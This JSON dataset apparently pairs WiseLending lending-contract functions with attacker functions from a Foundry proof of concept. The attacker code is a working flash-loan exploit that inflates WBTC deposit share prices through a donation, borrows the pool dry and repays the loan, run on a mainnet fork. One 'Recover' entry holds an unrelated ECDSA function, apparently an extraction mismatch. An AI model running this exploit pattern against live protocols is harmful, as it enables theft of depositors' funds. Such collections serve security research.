[
  {
    "contract/interface": "IPositionNFTs",
    "source_type": "victim_contract",
    "function_name": "mintPositionForUser",
    "original_code": "    function mintPositionForUser(\n        address _user\n    )\n        external\n        returns (uint256);\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "borrowExactAmount",
    "original_code": "    function borrowExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        external\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        WISE_SECURITY.checkOwnerPosition(\n            _nftId,\n            msg.sender\n        );\n\n        uint256 shares = calculateBorrowShares(\n            _poolToken,\n            _amount\n        );\n\n        _coreBorrowTokens(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount,\n            shares\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _amount\n        );\n\n        emit FundsBorrowed(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount,\n            shares,\n            block.timestamp\n        );\n\n        return shares;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "depositExactAmount",
    "original_code": "    function depositExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _amount\n    )\n        public\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 shareAmount = calculateLendingShares(\n            _poolToken,\n            _amount\n        );\n\n        _handleDeposit(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _amount,\n            shareAmount\n        );\n\n        _safeTransferFrom(\n            _poolToken,\n            msg.sender,\n            address(this),\n            _amount\n        );\n\n        return shareAmount;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "getPseudoTotalPool",
    "original_code": "    function getPseudoTotalPool(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return lendingPoolData[_poolToken].pseudoTotalPool;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "getTotalDepositShares",
    "original_code": "    function getTotalDepositShares(\n        address _poolToken\n    )\n        public\n        view\n        returns (uint256)\n    {\n        return lendingPoolData[_poolToken].totalDepositShares;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IWiseLending",
    "source_type": "victim_contract",
    "function_name": "withdrawExactAmount",
    "original_code": "    function withdrawExactAmount(\n        uint256 _nftId,\n        address _poolToken,\n        uint256 _withdrawAmount\n    )\n        external\n        syncPool(_poolToken)\n        returns (uint256)\n    {\n        uint256 withdrawShares = _preparationsWithdraw(\n            _nftId,\n            msg.sender,\n            _poolToken,\n            _withdrawAmount\n        );\n\n        _coreWithdrawToken(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _withdrawAmount,\n            withdrawShares\n        );\n\n        _safeTransfer(\n            _poolToken,\n            msg.sender,\n            _withdrawAmount\n        );\n\n        emit FundsWithdrawn(\n            msg.sender,\n            _nftId,\n            _poolToken,\n            _withdrawAmount,\n            withdrawShares,\n            block.timestamp\n        );\n\n        return withdrawShares;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        recover = new Recover();\n        uint256 recoverID = recover.init(); // open recover position\n\n        uint256 borrowerID = PositionNFTs.mintPositionForUser(address(this)); // open borrower position\n\n        WiseLending.depositExactAmount(recoverID, address(WBTC), 1); // deposit 1 WBTC to recover, mint 1 share\n        WiseLending.depositExactAmount(borrowerID, address(WBTC), 1); // deposit 1 WBTC to borrower, mint 1 share\n\n        WBTC.transfer(address(WiseLending), 50 * 1e8 - 2); // donate ~50 WBTC to WiseLending, inflate share price\n\n        borrowAll(borrowerID);\n\n        recover.recover(); // recover donated WBTC\n\n        int256 swapAmount = -int256(amounts[0] - WBTC.balanceOf(address(this)));\n        WETH_WBTC_Pair.swap(\n            address(this), false, swapAmount, uint160(35_991_486_685_722_499_892_781_286_346_438_453), \"\"\n        ); // swap WETH to WBTC\n        WBTC.transfer(address(Balancer), amounts[0]); // repay flash loan\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_342_120);\n        vm.label(address(WBTC), \"WBTC\");\n        vm.label(address(wstETH), \"wstETH\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(aEthWETH), \"aEthWETH\");\n        vm.label(address(DAI), \"DAI\");\n        vm.label(address(sDAI), \"sDAI\");\n        vm.label(address(aEthDAI), \"aEthDAI\");\n        vm.label(address(aEthUSDC), \"aEthUSDC\");\n        vm.label(address(aEthUSDT), \"aEthUSDT\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(PositionNFTs), \"PositionNFTs\");\n        vm.label(address(WiseLending), \"WiseLending\");\n        vm.label(address(WETH_WBTC_Pair), \"WETH_WBTC_Pair\");\n        vm.label(address(Balancer), \"Balancer\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        WBTC.approve(address(WiseLending), type(uint256).max);\n\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WBTC);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = 50 * 1e8;\n        bytes memory userData = \"\";\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n\n        profitLog();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        WETH.transfer(address(WETH_WBTC_Pair), uint256(amount1Delta));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Recover",
    "source_type": "victim_contract",
    "function_name": "init",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Recover",
    "source_type": "victim_contract",
    "function_name": "positionID",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Recover",
    "source_type": "victim_contract",
    "function_name": "recover",
    "original_code": "    function recover(bytes32 hash, bytes memory signature) internal pure returns (address) {\n        // Check the signature length\n        if (signature.length != 65) {\n            revert(\"ECDSA: invalid signature length\");\n        }\n\n        // Divide the signature in r, s and v variables\n        bytes32 r;\n        bytes32 s;\n        uint8 v;\n\n        // ecrecover takes the signature parameters, and the only way to get them\n        // currently is to use assembly.\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            r := mload(add(signature, 0x20))\n            s := mload(add(signature, 0x40))\n            v := byte(0, mload(add(signature, 0x60)))\n        }\n\n        return recover(hash, v, r, s);\n    }\n\n",
    "description": ""
  }
]